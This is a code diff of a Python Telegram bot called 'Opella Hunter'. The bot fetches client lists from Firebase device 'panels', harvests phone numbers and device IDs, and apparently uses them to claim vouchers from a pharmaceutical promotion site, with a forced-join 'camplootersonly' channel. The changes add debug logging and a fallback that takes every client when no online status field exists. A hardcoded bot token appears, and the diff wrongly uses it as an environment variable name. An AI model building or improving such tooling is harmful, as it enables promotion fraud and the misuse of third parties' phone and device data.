@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Opella Hunter — v15.2 (Auto-DATA_DIR + 1000+ Users + Silent File Logs)
+# Opella Hunter — v15.3 (Panel Debug + Device Fallback + 1000+ Users)
 # Credits: JD
 
 import asyncio, base64, hashlib, hmac, io, json, os, random, re, string, sys, threading, time, itertools, contextvars, zipfile
@@ -26,7 +26,14 @@ from telegram.error import BadRequest, RetryAfter, TimedOut, NetworkError
 # ════════════════════════════════════════════════════════════
 CREDIT    = "JD"
 BOT_NAME  = "Opella Hunter"
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8871069553:AAFBHDRPL1FIvdrQOS0KRCgrOhvj4URblxE")
+BOT_TOKEN = os.getenv("8871069553:AAFBHDRPL1FIvdrQOS0KRCgrOhvj4URblxE", "").strip()
+
+if not BOT_TOKEN:
+    print("=" * 60, flush=True)
+    print("[FATAL] BOT_TOKEN env variable not set!", flush=True)
+    print("[FATAL] Set BOT_TOKEN in Railway Variables.", flush=True)
+    print("=" * 60, flush=True)
+    sys.exit(1)
 
 FORCE_CHANNELS = [
     {"username": "@camplootersonly", "url": "https://t.me/camplootersonly"},
@@ -39,7 +46,7 @@ CHANNEL_URL      = "https://t.me/camplootersonly"
 
 OWNER_ID = int(os.getenv("OWNER_ID", "8880545620"))
 
-# ⭐ AUTO-DATA_DIR — /data use karo agar available ho (Railway volume)
+# ⭐ AUTO-DATA_DIR
 def _resolve_data_dir() -> Path:
     env = os.getenv("DATA_DIR")
     if env:
@@ -49,7 +56,6 @@ def _resolve_data_dir() -> Path:
             return p
         except Exception:
             pass
-    # Auto-detect: /data exists & writable → use it
     data_p = Path("/data")
     if data_p.exists() and os.access(data_p, os.W_OK):
         try:
@@ -59,7 +65,6 @@ def _resolve_data_dir() -> Path:
             return data_p
         except Exception:
             pass
-    # Fallback: script folder
     return Path(__file__).parent.resolve()
 
 DATA_DIR    = _resolve_data_dir()
@@ -146,7 +151,7 @@ CHANNEL_OK: Dict[str, bool] = {}
 CHANNEL_LOCK = threading.Lock()
 
 # ════════════════════════════════════════════════════════════
-#  ⭐ FILE LOGGER (silent, buffered, rotating)
+#  FILE LOGGER
 # ════════════════════════════════════════════════════════════
 class FileLogger:
     def __init__(self, name: str, log_dir: Path, max_bytes: int = LOG_MAX_BYTES,
@@ -611,27 +616,56 @@ def watch_voucher(user_id, chat_id, fb_url, device_id, phone, tag="", timeout=VO
     return None
 
 # ════════════════════════════════════════════════════════════
-#  DEVICE FETCH
+#  DEVICE FETCH — with debug logs
 # ════════════════════════════════════════════════════════════
 def fetch_devices_for_panel(firebase_url):
+    push_log(f"🔍 [{firebase_url}] fetching clients.json…", "info")
     try:
         r = requests.get(firebase_url + "clients.json", timeout=15, verify=False,
                          proxies=NO_PROXY, headers={"Connection": "keep-alive"})
+        push_log(f"🔍 [{firebase_url}] status={r.status_code} len={len(r.text)}", "info")
+        if r.status_code != 200:
+            push_log(f"❌ panel status {r.status_code} for {firebase_url}", "err")
+            MAIN_LOGGER.write(f"[panel] {firebase_url} status={r.status_code} body={r.text[:200]}")
+            return []
         clients = r.json()
-        if not isinstance(clients, dict): clients = {}
+        if not isinstance(clients, dict):
+            push_log(f"❌ panel returned {type(clients).__name__}, expected dict", "err")
+            MAIN_LOGGER.write(f"[panel] {firebase_url} non-dict response: {r.text[:200]}")
+            return []
     except Exception as e:
-        push_log(f"  ❌ panel err: {e}", "err"); return []
+        push_log(f"❌ panel err: {e}", "err")
+        MAIN_LOGGER.write(f"[panel] {firebase_url} exception: {e}")
+        return []
 
+    total = len(clients)
+    push_log(f"🔍 [{firebase_url}] {total} clients in DB", "info")
+    if total == 0:
+        push_log(f"⚠️ panel DB empty: {firebase_url}", "warn")
+        return []
+
+    # ⭐ Fallback: if no online status field, take ALL clients
     online = []
+    any_status_field = False
     for cid, cd in clients.items():
         if not isinstance(cd, dict): continue
-        status = cd.get("status") or cd.get("online") or cd.get("isOnline") or cd.get("state") or ""
+        status = cd.get("status") or cd.get("online") or cd.get("isOnline") or cd.get("state")
+        if status is not None: any_status_field = True
         if status is True: online.append(cid)
         elif isinstance(status, str) and status.strip().lower() in ("online","active","1","true","yes"): online.append(cid)
         elif isinstance(status, (int,float)) and status == 1: online.append(cid)
 
+    # ⭐ FALLBACK: agar koi status field hi nahi hai, toh saare clients le lo
+    if not online and not any_status_field:
+        online = list(clients.keys())
+        push_log(f"⚠️ no status field — using all {len(online)} clients", "warn")
+        MAIN_LOGGER.write(f"[panel] {firebase_url} no status field, fallback to all {len(online)}")
+
     if not online:
-        push_log(f"  ⚠️ no online clients", "warn"); return []
+        push_log(f"⚠️ {firebase_url} → 0 online of {total}", "warn")
+        return []
+
+    push_log(f"🔍 [{firebase_url}] {len(online)} online clients", "info")
 
     phone_pats = [
         re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"),
@@ -652,7 +686,7 @@ def fetch_devices_for_panel(firebase_url):
     out = []; seen = set()
     def one(cid):
         cd = clients.get(cid, {})
-        direct = cd.get("phone") or cd.get("mobile") or cd.get("number")
+        direct = cd.get("phone") or cd.get("mobile") or cd.get("number") or cd.get("phoneNumber")
         if direct:
             n = normalize_phone(direct)
             if n: return {"client_id": cid, "phone": n}
@@ -677,6 +711,9 @@ def fetch_devices_for_panel(firebase_url):
                 seen.add(res["phone"])
                 res["firebase_url"] = firebase_url
                 out.append(res)
+
+    push_log(f"✅ [{firebase_url}] {len(out)} devices extracted", "ok")
+    MAIN_LOGGER.write(f"[panel] {firebase_url} → {len(out)}/{len(online)} devices")
     return out
 
 # ════════════════════════════════════════════════════════════
@@ -762,6 +799,12 @@ def _net_call(fn, chat_id, retries=NET_RETRIES, backoff=NET_BACKOFF, on_retry=No
         except Exception as e:
             return {"statusCode": None, "message": f"{type(e).__name__}: {e}"}
     return last or {"statusCode": None, "message": "net retries exhausted"}
+
+BASE_URL = "https://www.worldpharmacistdaybyopella.com"
+API_BASE = f"{BASE_URL}/api"
+UTM_SOURCE = "qrcode"
+UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+      "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36")
 
 class OpellaClient:
     def __init__(self, chat_id: int, proxy=None, proxy_pool=None):
@@ -1060,6 +1103,8 @@ def get_render_lock(chat_id):
 def push_log(msg, cls="info"):
     owner = _current_chat.get()
     if owner is None:
+        try: MAIN_LOGGER.write(msg)
+        except: pass
         return
     try:
         get_user_logger(owner).write(msg)
@@ -1308,7 +1353,8 @@ async def _run_panel_inner(user_id, chat_id, fb_url, panel_idx, total_panels):
         )
         if not st_pairs: st_pairs = [("Karnataka", "Bangalore")]
         if not devices:
-            push_log("no devices", "warn"); return
+            push_log(f"❌ panel {panel_idx}: 0 devices — check panel URL/status", "err")
+            return
 
         for d in devices: ensure_number(st, panel_idx, d["phone"])
         st["devices_total"] += len(devices)
@@ -1848,7 +1894,7 @@ async def post_init(app):
     MAIN_LOOP = asyncio.get_running_loop()
     GLOBAL_USER_SEM = asyncio.Semaphore(MAX_USER_SLOTS)
     print("=" * 60, flush=True)
-    print(f"[startup] {BOT_NAME} v15.2", flush=True)
+    print(f"[startup] {BOT_NAME} v15.3", flush=True)
     print(f"[startup] DATA_DIR = {DATA_DIR}", flush=True)
     print(f"[startup] USERS_DIR = {USERS_DIR}", flush=True)
     print(f"[startup] LOG_DIR = {LOG_DIR}", flush=True)
